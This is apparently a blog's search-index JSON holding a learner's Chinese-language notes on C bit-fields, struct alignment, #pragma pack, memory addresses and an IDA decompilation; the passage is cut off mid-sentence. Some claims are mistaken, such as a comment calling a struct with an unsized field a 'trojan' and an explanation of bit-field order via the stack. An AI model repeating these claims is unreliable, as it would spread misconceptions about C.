{"config":{"lang":["en"],"separator":"[\\s\\u200b\\u3000\\-\u3001\u3002\uff0c\uff0e\uff1f\uff01\uff1b]+","pipeline":["stemmer"]},"docs":[{"location":"","title":"Leo Tan\u2019s Blog","text":""},{"location":"#_1","title":"\u8fd9\u662f\u4ec0\u4e48\uff1f","text":"<p>\u8fd9\u662fLeo\u7684\u535a\u5ba2\u7f51\u7ad9\uff0cLeo\u4f5c\u4e3a\u4f5c\u8005\u5c06\u4f1a\u5728\u8fd9\u4e2a\u7f51\u7ad9\u4e0a\u5206\u4eab\u81ea\u5df1\u7684\u5b66\u4e60\u7b14\u8bb0\u548c\u5b66\u4e60\u5fc3\u5f97\u3002</p> <p>\u76ee\u524d\u4e3b\u8981\u5f00\u8bbe\u7684\u680f\u76ee\u6709\uff1a</p> <ul> <li>Java\u6e90\u7801\u5206\u6790</li> <li>Java\u5de5\u5177\u4f7f\u7528</li> <li>C\u8bed\u8a00\u5206\u6790</li> <li>\u8bfe\u7a0b\u7b14\u8bb0</li> </ul> <p>\u867d\u7136\u76ee\u524d\u5c0f\u7834\u7ad9\u7684\u5185\u5bb9\u4e0d\u591a\uff0c\u4f46\u662fLeo\u4f1a\u52a0\u73ed\u66f4\u65b0\u6ef4~~</p>"},{"location":"Note/","title":"\u5b66\u4e60\u7b14\u8bb0","text":"<p>\u8fd9\u4e2a\u76ee\u5f55\u4e0b\u4e3b\u8981\u5b58\u653e\u6211\u7cfb\u7edf\u5b66\u4e60\u7684\u7b14\u8bb0\u76ee\u524d\u6709</p> <ol> <li>Java\u6e90\u7801\u5206\u6790</li> <li>JVM\u5b66\u4e60</li> <li>MySQL\u5b66\u4e60</li> <li>C\u8bed\u8a00\u5e95\u5c42\u8fd0\u7528</li> <li>\u8ba1\u7b97\u673a\u7684\u7ec4\u6210\u539f\u7406</li> <li>\u8ba1\u7b97\u673a\u7f51\u7edc</li> </ol> <p>\u6784\u5efa\u4e00\u4e2a\u77e5\u8bc6\u5e93\uff0c\u8bb0\u5f55\u5728\u7cfb\u7edf\u5b66\u4e60\u67d0\u65b9\u9762\u65f6\u7684\u7b14\u8bb0</p>"},{"location":"Note/C%E8%AF%AD%E8%A8%80%E5%BA%95%E5%B1%82%E8%BF%90%E7%94%A8/","title":"C\u8bed\u8a00\u5e95\u5c42\u8fd0\u7528","text":""},{"location":"Note/C%E8%AF%AD%E8%A8%80%E5%BA%95%E5%B1%82%E8%BF%90%E7%94%A8/#_1","title":"\u4e00\u3001\u4f4d\u6bb5\u7ed3\u6784","text":"<p>\u6211\u4eec\u90fd\u77e5\u9053\u5728c\u8bed\u8a00\u5e95\u5c42\u4e2d\u6d6e\u70b9\u7c7b\u578b\u7684\u6570\u636e\u50a8\u5b58\u662f\u5206\u6bb5\u7684\uff0c\u5e76\u4e14\u6bcf\u4e00\u6bb5\u90fd\u6709\u4ed6\u81ea\u5df1\u7684\u7279\u6b8a\u542b\u4e49\uff0c\u90a3\u4e48\u8fd9\u4e9b\u7279\u6b8a\u542b\u4e49\u662f\u600e\u4e48\u89c4\u5b9a\u7684\u5462\uff1f\u6211\u4eec\u53ef\u4e0d\u53ef\u4ee5\u81ea\u5b9a\u4e49\u4e00\u79cd\u7279\u6b8a\u7684\u6570\u636e\u7c7b\u578b\u5462\uff1f\u8fd9\u4e2a\u65f6\u5019\u5c31\u8981\u4ecb\u7ecd\u5230\u4f4d\u6bb5\u7ed3\u6784\u4e86\uff01</p> <p>\u9996\u5148\u8ba9\u6211\u4eec\u5206\u6790\u4e00\u4e0bFLOAT\u6570\u636e\u7c7b\u578b\u7684\u5e95\u5c42\u662f\u600e\u6837\u5b58\u50a8\u7684\uff1a</p> <p>float\u5728\u5185\u5b58\u4e2d\u7528\u6307\u6570\u578b\u5f0f\u8868\u793a\uff0c\u5206\u89e3\u4e3a\uff1a\u6570\u7b26\uff0c\u5c3e\u6570\uff0c\u6307\u6570\u7b26\uff0c\u6307\u6570\u56db\u90e8\u5206\u3002</p> <p>\u6570\u7b26\u5360 1 \u4f4d\u4e8c\u8fdb\u5236\uff0c\u8868\u793a\u6570\u7684\u6b63\u8d1f\u3002</p> <p>\u6307\u6570\u53608\u4f4d\u4e8c\u8fdb\u5236\uff0c\u8868\u793a\u6307\u6570\u5927\u5c0f\uff0c\u5176\u4e2d\u8fd8\u5305\u62ec\u6307\u6570\u4e3a\u7684\u6b63\u8d1f\u3002</p> <p>\u5c3e\u6570\u536023\u4f4d\uff0c\u8868\u793a\u6d6e\u70b9\u6570\u6709\u6548\u6570\u5b57\uff0c0.xxxxxxx, \u4f46\u4e0d\u5b58\u5f00\u5934\u7684 0 \u548c\u70b9\u3002</p> <p>\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u770b\u5230\uff0cfloat\u5c3d\u7136\u6ca1\u6709\u6309\u7167\u4e00\u5b57\u8282\u4e00\u5b57\u8282\u7684\u8fdb\u884c\u5b58\u50a8\u548c\u8fd0\u7b97\uff0c\u8fd9\u548c\u6211\u4eec\u6240\u8ba4\u8bc6\u7684int\u3001byte\u3001char\u7b49\u90fd\u4e0d\u4e00\u6837\uff0c\u90a3\u4e48\u6211\u4eec\u662f\u4e0d\u662f\u4e5f\u53ef\u4ee5\u6765\u5b9e\u73b0\u540c\u6837\u7684\u529f\u80fd\u5462\uff1f</p> <p>\u8fd9\u91cc\u6211\u4eec\u5148\u76f4\u63a5\u4e0a\u4ee3\u7801\uff0c\u901a\u8fc7\u4ee3\u7801\u89e3\u91ca\u4f4d\u6bb5\u7ed3\u6784</p> <pre><code>struct{\n    unsigned sign:1;//\u7b26\u53f7\u4f4d\n    unsigned index :8;//\u6307\u6570\n    unsigned num : 23;//\u5c3e\u6570\n} my_float;\n</code></pre> <p>\u6ca1\u9519\uff0c\u5c31\u662f\u5728\u6bcf\u4e00\u4e2a\u7ed3\u6784\u4f53\u6210\u5458\u540e\u9762\u5236\u5b9a\u4ed6\u6240\u8981\u5360\u7684\u4f4d\u6570\u3002\u90a3\u4e48\u53ef\u4ee5\u5b9e\u73b0\u53ea\u536020\u4f4d\u5417\uff1f</p> <p>\u7b54\u6848\u662f\u53ef\u4ee5\u7684\uff0c\u4f46\u662f\u8fd9\u5e76\u4e0d\u4f1a\u5bf9\u7a7a\u95f4\u6709\u6240\u8282\u7701\uff0c\u5e94\u4e3a\u8ba1\u7b97\u673a\u4f1a\u81ea\u52a8\u4e3a\u4f60\u8865\u9f50\u4e3a8\u7684\u500d\u6570\uff0c\u6bd4\u5982\u4f60\u53ea\u4f7f\u7528\u4e8620\u4f4d\uff0c\u4f46\u662f\u8ba1\u7b97\u673a\u4f1a\u81ea\u52a8\u4e3a\u4f60\u8865\u9f50\u4e3a24\u4f4d\uff0c\u5f53\u7136\uff0c\u8fd9\u4e5f\u4e0d\u662f\u4e00\u5b9a\u7684\uff0c\u4e0b\u9762\u51e0\u4e2a\u4f8b\u5b50\u5e2e\u52a9\u6211\u4eec\u7406\u89e3\u3002</p>"},{"location":"Note/C%E8%AF%AD%E8%A8%80%E5%BA%95%E5%B1%82%E8%BF%90%E7%94%A8/#_2","title":"\u4f4d\u6bb5\u7ed3\u6784\u7684\u4f7f\u7528","text":"<pre><code>struct{\n    unsigned sign:1;//\u7b26\u53f7\u4f4d\n    unsigned index :8;//\u6307\u6570\n    unsigned num : 23;//\u5c3e\u6570\n} demo_00;\n//4\u4e2a\u5b57\u8282\n//==================\nstruct{\n    int sign:1;//\u7b26\u53f7\u4f4d\n    int num:7;\n}demo_01;\n//4\u4e2a\u5b57\u8282\n//======================\nstruct{\n    char sign:1;//\u7b26\u53f7\u4f4d\n    char num:7;\n}demo_02;\n//1\u4e2a\u5b57\u8282\n//================\nstruct{\n    int sign : 31;\n    char num :3;\n}demo_03;\n//8\u4e2a\u5b57\u8282\n//===============\nstruct{\n    char sign : 7;\n    char num :3;\n}demo_04;\n//2\u4e2a\u5b57\u8282\n</code></pre> <p>\u4e00\u4e2a\u4f4d\u6bb5\u5fc5\u987b\u5b58\u50a8\u5728\u540c\u4e00\u5b58\u50a8\u5355\u5143\u4e2d\uff0c\u4e0d\u80fd\u8de8\u4e24\u4e2a\u5355\u5143\u3002\u5982\u679c\u7b2c\u4e00\u4e2a\u5355\u5143\u7a7a\u95f4\u4e0d\u80fd\u5bb9\u7eb3\u4e0b\u4e00\u4e2a\u4f4d\u6bb5\uff0c\u5219\u8be5\u7a7a\u95f4\u4e0d\u7528\uff0c\u800c\u4ece\u4e0b\u4e00\u4e2a\u5355\u5143\u8d77\u5b58\u653e\u8be5\u4f4d\u6bb5\u3002</p> <p>\u8fd8\u53ef\u4ee5\u5236\u5b9a\u65e0\u540d\u4f4d\u6bb5\uff0c\u65e0\u540d\u4f4d\u6bb5\u7684\u4f5c\u7528\u5c31\u662f\u5bf9\u5176\u540e\u9762\u7684\u4f4d\u6bb5\u3002</p> <p>\u540c\u65f6\u8fd9\u91cc\u8fd8\u6d89\u53ca\u5230\u7ed3\u6784\u4f53\u5bf9\u5176\u7684\u76f8\u5173\u77e5\u8bc6\uff1a\u7ed3\u6784\u4f53\u8fd8\u9700\u8981\u6574\u4f53\u5bf9\u5176\uff0c\u4e5f\u5c31\u662f\u548c\u4ed6\u7684\u6700\u957f\u5b57\u6bb5\u5bf9\u5176\u3002</p>"},{"location":"Note/C%E8%AF%AD%E8%A8%80%E5%BA%95%E5%B1%82%E8%BF%90%E7%94%A8/#_3","title":"\u4e0b\u9762\u51e0\u79cd\u5e38\u89c1\u7684\u4f7f\u7528\u4f4d\u6bb5\u7ed3\u6784\u7684\u9519\u8bef\uff1a","text":"<ol> <li> <p><code>c    struct{        unsigned sign:1;//\u7b26\u53f7\u4f4d        unsigned index :8;//\u6307\u6570        float num : 23;//\u5c3e\u6570    } demo_00;    //[Error] bit-field 'sign' has invalid type    //\u5728\u8fd9\u79cd\u7c7b\u578b\u4e2d\u53ea\u5141\u8bb8\u4f7f\u7528int\u3001char\u5bb6\u65cf\u7684\u7c7b\u578b\uff0c\u6bd4\u5982long long int\u3001unsigned int</code></p> </li> <li> <p><code>c    struct{        unsigned sign:1;        unsigned index :8;        unsigned num : 55;    } demo_01;    //[Error] width of 's' exceeds its type    //\u5236\u5b9a\u957f\u5ea6\u662f\u4e0d\u53ef\u4ee5\u8d85\u51fa\u672c\u8eab\u7684\u957f\u5ea6</code></p> </li> <li> <p><code>c    struct{        unsigned sign:1;//\u7b26\u53f7\u4f4d     int num;    } demo_02;    //\u4e00\u822c\u4f1a\u88ab\u5f53\u505a\u6728\u9a6c\u75c5\u6bd2\u5904\u7406    //\u6bcf\u4e00\u4e2a\u5b57\u6bb5\u90fd\u6709\u6307\u5b9a\u7684\u5927\u5c0f    //\u4f46\u662f\u5982\u679c\u7f3a\u7701\uff0c\u7cfb\u7edf\u5c31\u4f1a\u6309\u7c7b\u578b\u672c\u8eab\u7684\u5927\u5c0f\u5206\u914d\u5185\u5b58</code></p> </li> </ol>"},{"location":"Note/C%E8%AF%AD%E8%A8%80%E5%BA%95%E5%B1%82%E8%BF%90%E7%94%A8/#_4","title":"\u4e8c\u3001\u5b57\u6bb5\u5bf9\u5176","text":""},{"location":"Note/C%E8%AF%AD%E8%A8%80%E5%BA%95%E5%B1%82%E8%BF%90%E7%94%A8/#_5","title":"\u7cfb\u7edf\u9ed8\u8ba4\u5b57\u6bb5\u5bf9\u5176","text":"<p>\u7ed3\u6784\u4f53\u5185\u53ef\u4ee5\u88ab\u770b\u505a\u4e00\u4e2a\u6574\u4f53\uff0c\u90a3\u4e48\u6574\u4f53\u5185\u7684\u5404\u4e2a\u5b57\u6bb5\u5e94\u8be5\u5982\u4f55\u5b58\u653e\u5462\uff1f\u6211\u4eec\u4ece\u4e0a\u9762\u7684\u4f8b\u5b50\u77e5\u9053\uff0c\u6570\u636e\u7684\u5f00\u59cb\u4f4d\u53ea\u80fd\u653e\u5728\u5185\u5b58\u5730\u5740\u7684\u6574\u6570\u500d\u4e0a\u9762\u3002\u6b64\u8bdd\u600e\u8bb2\uff1f</p> <p>\u8fd9\u4e2a\u4f8b\u5b50\u91cc\uff0c\u6211\u4eec\u770b\u5230\u4e86\u5b57\u6bb5\u7684\u5bf9\u5176\u65b9\u5f0f\uff0c\u90a3\u4e48\u5728\u8fd9\u6709\u4ec0\u4e48\u6709\u5462\uff1f\u4e3e\u4e2a\u4f8b\u5b50\uff1a</p> <pre><code>#include&lt;stdio.h&gt;\nint main(){\n    char a;//1byte\n    int b;//4byte\n    short c;//2byte\n    return 0;\n}\n</code></pre> <p>\u6808\u5185\u5b58\u7ed3\u6784\u5982\u4e0b</p> <p>\u6211\u4eec\u53d1\u73b0\u4ed6\u6709\u5f88\u5927\u4e00\u7247\u7a7a\u95f4\u88ab\u6d6a\u8d39\uff0c\u90a3\u4e48\u5982\u679c\u6211\u4eec\u8c03\u6574\u4e00\u4e0b\u987a\u5e8f\u5462\uff1f</p> <pre><code>#include&lt;stdio.h&gt;\nint main(){\n    char a;//1byte\n    short c;//2byte\n    int b;//4byte\n    return 0;\n}\n</code></pre> <p>\u6ca1\u9519\uff0c\u53ea\u662f\u7b80\u5355\u7684\u8c03\u6574\u4e00\u4e0b\u987a\u5e8f\uff0c\u6211\u4eec\u7684\u5185\u5b58\u5c31\u7a7a\u4e86\u5f88\u591a\uff0c\u8fd9\u8fd8\u53ea\u662f\u51b0\u5c71\u4e00\u89d2\uff0c\u5982\u679c\u5b9e\u5728\u6211\u4eec\u7ecf\u5e38\u4f7f\u7528\u7684\u590d\u6742\u7684\u7ed3\u6784\u4f53\u4e2d\uff0c\u90a3\u8fd9\u6837\u7684\u4f18\u5316\u5e26\u6765\u7684\u6548\u76ca\u662f\u5341\u5206\u53ef\u89c2\u7684\u3002\u4e0d\u884c\u4f60\u53ef\u4ee5\u4f7f\u7528<code>sizeof</code>\u5bf9\u4ed6\u8fdb\u884c\u6d4b\u8bd5\u3002</p> <p>\u90a3\u5982\u679c\u60f3\u8fdb\u4e00\u6b65\u8282\u7701\u5185\u5b58\u7a7a\u95f4\u5462\uff0c\u54b1\u4eec\u53ef\u4e0d\u53ef\u4ee5\u6307\u5b9a\u4ed6\u7684\u5bf9\u5176\u65b9\u5f0f\u5462\uff1f\u8fd9\u662f\u5c31\u8981\u4ecb\u7ecd\u5230<code>pragma pack()</code>\u7684\u7528\u6cd5\u4e86</p>"},{"location":"Note/C%E8%AF%AD%E8%A8%80%E5%BA%95%E5%B1%82%E8%BF%90%E7%94%A8/#pragma-pack","title":"#pragma pack","text":"<p>\u9996\u5148\u6211\u4eec\u6765\u4e86\u89e3\u4e00\u4e0b\u7cfb\u7edf\u5bf9\u5176\u7684\u539f\u7406\uff1a</p> <p>\u5728\u7cfb\u7edf\u5e95\u5c42\u6709\u4e00\u4e2a\u53d8\u91cf\u7528\u6765\u5b58\u50a8\u5bf9\u5176\u65b9\u5f0f\u7684\u5927\u5c0f\uff0c\u4e5f\u5c31\u662fn\u7684\u500d\u6570\u4e2d\u7684n\uff0c\u7cfb\u7edf\u662f\u8fd9\u6837\u89c4\u5b9a\u7684\uff1a\u7cfb\u7edf\u5185\u90e8\u6709\u4e00\u4e2a\u9608\u503c\uff0c\u7528\u6765\u8bbe\u5b9a\u6700\u5927\u7684n\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u5206\u914d\u5185\u5b58\u65f6\uff0c\u4f1a\u53d6\u9608\u503c\u548c\u53d8\u91cf\u672c\u8eab\u7684\u5927\u5c0f\u7684\u6700\u5c0f\u503c\u6765\u5bf9\u5176\uff0c\u4ee5int\u4e3a\u4f8b\uff0cint\u7684\u5927\u5c0f\u662f4\u4e2a\u5b57\u8282\uff0c\u4e8c\u6211\u7684\u7535\u8111\u7684\u9608\u503c\u662f16\uff0c\u90a3\u4e48\u4e5f\u5c31\u662f\u53d64\u4f4dint\u7684\u5bf9\u5176\u65b9\u5f0f\uff0c\u540c\u65f6\u7ed3\u6784\u4f53\u5185\u53d6\u6700\u5927\u7684\u5bf9\u9f50\u65b9\u5f0f\u3002</p> <p>\u90a3\u4e48\u65e2\u7136\u662f\u4e2a\u53d8\u91cf\uff0c\u6211\u4eec\u662f\u5426\u53ef\u4ee5\u6539\u53d8\u5462\uff1f\u8fd9\u662f\u5c31\u8981\u4ecb\u7ecd\u6211\u4eec\u8981\u5b66\u7684\u6307\u4ee4\u4e86\uff0c</p> <pre><code>#pragma pack(show)\n//\u67e5\u770b\u7cfb\u7edf\u7684\u9ed8\u8ba4\u503c\uff0c\u53ea\u9002\u7528\u4e8evc\u7f16\u8bd1\u5668\uff0cgcc\u81ea\u52a8\u5ffd\u7565\n//\u6b64\u8bed\u53e5\u5c5e\u4e8emessage\u8bed\u53e5\uff0c\u5728\u7f16\u8bd1\u65f6\u4f1a\u81ea\u52a8\u8f93\u51fa\u5230\u63a7\u5236\u53f0\uff0cgcc\u4e0d\u652f\u6301message\u8bed\u53e5\n#pragma message(\"helloworld\")\n//\u540c\u4e00\u7c7b\u578b\u7684\u8bed\u53e5\u8fd8\u6709\n#pragma pack()\n//\u56de\u590d\u9ed8\u8ba4\n#pragma pack(1)\n//\u6307\u5b9a\u5bf9\u5176\u5927\u5c0f\u4e3a1\u4f4d\ntypedef struct\n{\n  char s;\n  short b;\n  int a;\n\n}flo;\n//\u6b64\u65f6flo\u6240\u5360\u5185\u5b58\u4e3a7\uff0c\u4e2d\u95f4\u6ca1\u6709\u7a7a\u4f4d\uff0c\u540c\u65f6\u7ed3\u6784\u4f53\u4e5f\u6309\u6307\u5b9a\u7684\u6765\uff08\u5b57\u6bb5\u7684\u5bf9\u5176\u5927\u5c0f\u90fd\u53d8\u62101\u4e86\u561b\uff01\u6240\u4ee5\u6700\u5927\u4e5f\u662f1\uff09\n</code></pre> <p>\u8fd9\u4e2a\u5b57\u6bb5\u5bf9\u9f50\u63a7\u5236\u7684\u5e94\u7528\u4e0d\u53ea\u662f\u5728\u5185\u5b58\u7ba1\u7406\u4e0a\uff0c\u8fd8\u6709\u7f51\u7edc\u4f20\u8f93\u4e0a\u3002</p> <p>\u4e0d\u540c\u7684\u64cd\u4f5c\u7cfb\u7edf\u5bf9\u4e8e\u5bf9\u9f50\u5927\u5c0f\u7684\u9ed8\u8ba4\u503c\u662f\u4e0d\u4e00\u6837\u7684\uff0c\u800c\u5728\u4e8c\u8fdb\u5236\u7f51\u7edc\u4f20\u8f93\u4e2d\uff0c\u53d1\u9001\u65b9\u548c\u63a5\u6536\u65b9\u7684\u5bf9\u5176\u4e0d\u4e00\uff0c\u4e5f\u5c31\u5bfc\u81f4\u63a5\u6536\u65b9\u6570\u636e\u8bfb\u53d6\u5f02\u5e38\uff0c\u56e0\u6b64\uff0c\u5728\u7f51\u7edc\u4f20\u8f93\u4e2d\u5fc5\u987b\u660e\u786e\u89c4\u5b9a\u53d1\u6536\u53cc\u65b9\u7684\u5b57\u6bb5\u5bf9\u5176\u5927\u5c0f\u3002\u4e3a\u4e86\u8282\u7701\u7a7a\u95f4\uff0c\u540c\u65f6\u5728\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u63d0\u9ad8\u4f20\u8f93\u6548\u7387\uff0c\u4e00\u822c\u8bbe\u4e3a1\u3002\u4f46\u662f\u8981\u6ce8\u610f\uff0c\u8bbe\u4e3a1\u5e76\u4e0d\u662f\u6700\u597d\u7684\u9009\u7740\uff0c\u56e0\u4e3a\u5728\u7f16\u7801\u89e3\u7801\u7684\u65f6\u95f4\u4e0a\u4f1a\u6709\u4e00\u5b9a\u7684\u635f\u8017\u3002</p>"},{"location":"Note/C%E8%AF%AD%E8%A8%80%E5%BA%95%E5%B1%82%E8%BF%90%E7%94%A8/#c_1","title":"\u4e09\u3001C\u8bed\u8a00\u5185\u5b58\u5206\u914d","text":"<p>\u5728\u6808\u548c\u5806\u4e2d\u7684\u5185\u5b58\u90fd\u662f\u968f\u7a0b\u5e8f\u6267\u884c\u52a8\u6001\u53d8\u5316\u7684\uff0c\u90a3\u4e48\u4ed6\u7684\u5730\u5740\u662f\u5982\u4f55\u5206\u914d\u800c\u4fdd\u8bc1\u4e0d\u51b2\u7a81\u7684\u5462\uff1f</p> <p></p> <p>\u8fd9\u662f\u7f51\u4e0a\u535a\u5ba2\u7684\u3002\u90a3\u4e48\u6211\u4eec\u5c31\u7528\u5b9e\u9a8c\u6765\u9a8c\u8bc1\u4e00\u4e0b\u5427\uff01</p> <p>\u9996\u5148\u662f\u4e00\u6bb5\u5341\u5206\u7b80\u5355\u7684\u4ee3\u7801\u3002</p> <pre><code>#include&lt;stdio.h&gt;\n\nstatic int s_num1 = 1;\nstatic int s_num2 = 2;\nint output(int *p){\n    printf(\"0x%-10x:%d\\n\",p,*p);\n    return *p;\n}\n\nint main(){\n\n    int num1 = 0;\n    output(&amp;num1);//0xf09ffab8\n\n    int num2 = 3;\n    output(&amp;num2);//0xf09ffabc\n    //\u9996\u5148\u77e5\u9053\uff0c\u5c40\u90e8\u53d8\u91cf\u662f\u653e\u5728\u6808\u91cc\u9762\u7684\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u5730\u5740\u662f\u4ece\u4f4e\u5730\u5740\u5230\u9ad8\u5730\u5740\u5206\u914d\u7684\n\n    output(&amp;s_num1);//0x6e498014\n    output(&amp;s_num2);//0x6e498010\n    //\u5bf9\u4e8e\u9759\u6001\u53d8\u91cf\uff0c\u6216\u8005\u5168\u5c40\u53d8\u91cf\uff0c\u4e5f\u5c31\u662f\u4ece\u9ad8\u5730\u5740\u5411\u4f4e\u5730\u5740\u5206\u914d\n    return 0;\n}\n</code></pre> <p>\u5f53\u7136\uff0c\u4ee5\u4e0a\u53ea\u662f\u4f5c\u4e3aWindows\u5e73\u53f0\u7684\u6d4b\u8bd5\uff0c\u636e\u8bf4\u4e0d\u540c\u7cfb\u7edf\u4f1a\u6709\u4e0d\u540c\u7684\u5206\u914d\u65b9\u5f0f\u3002\u4f46\u662f\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u4e9b\u90fd\u662f\u865a\u62df\u5730\u5740\u3002</p>"},{"location":"Note/C%E8%AF%AD%E8%A8%80%E5%BA%95%E5%B1%82%E8%BF%90%E7%94%A8/#c_2","title":"\u56db\u3001c\u8bed\u8a00\u7ed3\u6784\u4f53\u5728\u5185\u5b58\u4e2d\u7684\u5f62\u5f0f","text":"<p>\u4eca\u5929\u5c1d\u8bd5\u5bf9c\u8bed\u8a00\u7ed3\u6784\u4f53\u7684\u5185\u5b58\u7ed3\u6784\u8fdb\u884c\u63a2\u7d22\uff0c\u53d1\u73b0\u4e86\u7ed3\u6784\u4f53\u5728\u5185\u5b58\u4e2d\u7684\u6392\u5e03\u65b9\u5f0f\uff08\u5b9e\u9a8c\u73af\u5883\u662fwindows11\uff0carm7\uff09</p> <pre><code>#include &lt;stdio.h&gt;\nstruct Node{\n    unsigned flag:1;\n    unsigned isReadable:1;\n    unsigned isChangeable:1;\n    unsigned value : 29;\n};\ntypedef struct Node NODE;\nint main() {\n    printf(\"%d\\n\", sizeof(NODE));//4\n    NODE  n = {1,1,1,33333};\n    printf(\"%u %u %u %u\\n\",n.flag,n.isReadable,n.isChangeable,n.value);//1 1 1 33333\n    printf(\"%x\",n);//411af\n\n    return 0;\n}\n/*\u8f93\u51fa\u7ed3\u679c\n4\n1 1 1 33333\n411af\n*/\n</code></pre> <p>\u6211\u4eec\u9996\u5148\u5b9a\u4e49\u4e00\u4e2a\u7ed3\u6784\u4f53\uff0c\u4e3a\u4e86\u8ba9\u5185\u90e8\u53d8\u91cf\u5206\u5e03\u66f4\u52a0\u660e\u663e\uff0c\u6211\u4eec\u4f7f\u7528\u4e86\u4e00\u4e9b\u6709\u5173\u4f4d\u6bb5\u7ed3\u6784\u4f53\u7684\u77e5\u8bc6</p> <p>\u6211\u4eec\u5f00\u59cb\u5bf9\u4e8e\u8f93\u51fa\u7ed3\u679c\u8fdb\u884c\u5206\u6790\uff0c\u9996\u5148\u53ef\u4ee5\u80af\u5b9a\u7684\u662f\uff0c\u5bf9\u4e8e\u7b2c\u4e8c\u884c\u8f93\u51fa\u7ed3\u679c\u662f\u6bcb\u5eb8\u7f6e\u7591\u7684\uff0c\u56e0\u4e3a\u4f7f\u6211\u4eec\u7684\u590d\u5236\uff0c\u90a3\u7b2c\u4e09\u884c\u4f1a\u548c\u7b2c\u4e8c\u884c\u6709\u600e\u6837\u7684\u5173\u8054\u5462\uff1f</p> <p>\u6211\u4eec\u5728\u8ba1\u7b97\u5668\u4e2d\u5bf9\u4e8e\u8fd9\u4e2a16\u8fdb\u5236\u6570\u8fdb\u884c\u8f6c\u6362\u7b49\u53f7\u5982\u4e0b\u7ed3\u679c</p> <p></p> <p>\u4f3c\u4e4e\u4e0d\u80fd\u76f4\u89c2\u7684\u770b\u5230\u6211\u4eec\u7684\u7ed3\u679c\uff0c\u5176\u5b9e\u5728\u8bbe\u7f6e\u524d\u9762\u51e0\u4e2a1\u4f4d\u7684\u6807\u5fd7\u4f4d\u7684\u65f6\u5019\u5e94\u8be5\u8bbe\u7f6e\u7684\u5e26\u6709\u67d0\u4e9b\u7279\u5f81\uff0c\u4e5f\u5c31\u662f\u7279\u5b9a\u7684\u6bd4\u7279\uff0c\u4f46\u662f\u61d2\u5f97\u53bb\u91cd\u65b0\u5199\uff0c\u800c\u4e14\u6211\u5f88\u5e78\u8fd0\uff0c\u7acb\u9a6c\u731c\u5230\u4e86\u6b63\u786e\u7b54\u6848\u3002</p> <p>\u731c\u6d4b\u4e09\u4e2a1\u5e94\u8be5\u662f\u8fde\u4e00\u8d77\u7684\uff0c\u56e0\u6b64\u5c31\u662f\u540e\u9762\u90a3\u4e09\u4e2a\u4e00\u4e86\uff0c\u679c\u7136\uff0c\u6211\u628a\u540e\u9762\u90a3\u4e09\u4e2a1\u53bb\u6389\u4ee5\u540e\uff0c\u524d\u9762\u7684\u6570\u5b57\u4e5f\u5c31\u662f33333</p> <pre><code>0100 0001 0001 1010 1 ===&gt; 33333\n</code></pre> <p>\u90a3\u4e48\u4e5f\u5c31\u51fa\u6765\u4e86\uff0c\u7ed3\u6784\u4f53\u4e0b\u5b9a\u4e49\u7684\u5728\u7ed3\u6784\u4f53\u540e\u9762\uff0c\u540e\u5b9a\u4e49\u7684\u5728\u7ed3\u6784\u4f53\u524d\u9762\uff0c</p> <p>\u5176\u5b9e\u4e5f\u5f88\u597d\u7406\u89e3\uff0c\u6808\u4e0d\u662f\u5148\u8fdb\u540e\u51fa\uff0c\u90a3\u524d\u9762\u5148\u8fdb\u6765\u7684\u4e0d\u5c31\u5728\u5e95\u4e0b\u4e48\uff1f</p> <p>\u8bf4\u9053\u8fd9\u91cc\uff0c\u4e0d\u59a8\u8bd5\u8bd5\u5982\u679c\u53d8\u91cf\u5728\u5806\u91cc\u4f1a\u4e0d\u4f1a\u4e00\u6837\u5462\uff1f</p> <pre><code>#include &lt;stdio.h&gt;\nstruct Node{\n    unsigned flag:1;\n    unsigned isReadable:1;\n    unsigned isChangeable:1;\n    unsigned value : 29;\n};\ntypedef struct Node NODE;\nNODE  n = {1,1,1,33333};//\u5176\u5b9e\u53ea\u9700\u8981\u5427\u4ed6\u79fb\u5230\u51fd\u6570\u5916\u9762\u5c31\u53ef\u4ee5\u4e86\nint main() {\n\n    printf(\"%d\\n\", sizeof(NODE));\n    printf(\"%u %u %u %u\\n\",n.flag,n.isReadable,n.isChangeable,n.value);\n    printf(\"%x\",n);\n\n    return 0;\n}\n</code></pre> <p>\u7ed3\u679c\u8fd8\u662f\u4e00\u6837\uff0c\u90a3\u4e5f\u5c31\u662f\u8bf4\u548c\u6808\u8fd8\u662f\u5806\u6ca1\u6709\u5173\u7cfb\uff0c\u5168\u770b\u7f16\u8bd1\u5668\u3002</p> <p>\u518d\u5f80\u5e95\u5c42\u8d70\uff0c\u6211\u4eec\u4f7f\u7528ida\u5bf9\u4ed6\u8fdb\u884c\u53cd\u7f16\u8bd1\u53ef\u4ee5\u770b\u5230\u4e00\u70b9\u7684\u60c5\u51b5\uff08\u8fd9\u4e2a\u53ea\u662f\u5728\u7b2c\u4e8c\u4e2d\u60c5\u51b5\u7684\u4ee3\u7801\u4e2d\uff09</p> <pre><code>int __cdecl main(int argc, const char **argv, const char **envp)\n{\n  unsigned int v4; // [rsp+20h] [rbp-10h]\n\n  _main(argc, argv, envp);\n  printf(\"%d\\n\", 4i64);\n  v4 = (unsigned int)n &gt;&gt; 3;\n  printf(\"%u %u %u %u\\n\", n &amp; 1, (n &amp; 2) != 0, (n &amp; 4) != 0, v4);\n  printf(\"%x\", (unsigned int)n);\n  return 0;\n}\n</code></pre> <p>\u9996\u5148\u53ef\u4ee5\u770b\u5230\uff0c\u7f16\u8bd1\u5668\u4f1a\u5c06\u6211\u4eec\u6ca1\u6709\u5199\u51fa\u6765\u7684\u4ee3\u7801\u8865\u5168\uff0c\u6bd4\u5982__cdecl(\u51fd\u6570\u7ea6\u5b9a)\uff0c\u5e76\u4e14\u4e5f\u4f1a\u5c06\u90a3\u4e9b\u547d\u4ee4\u884c\u53c2\u6570\u8865\u5168\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u5728\u5e95\u5c42\u7684main\u90fd\u662f\u4e00\u6837\u7684</p> <p>\u5176\u6b21\uff0c\u6211\u4eec\u770b\u5230\u4e86\u4e00\u4e2a\u4f4d\u8fd0\u7b97</p> <pre><code>v4 = (unsigned int)n &gt;&gt; 3;//\u53bb\u540e\u4e09\u4f4d\u7684\u5176\u4f59\u4f4d\nn &amp; 1;//\u6700\u540e\u4e00\u4f4d\n(n &amp; 2) != 0;//\u5012\u6570\u7b2c\u4e8c\u4f4d\n(n &amp; 4) != 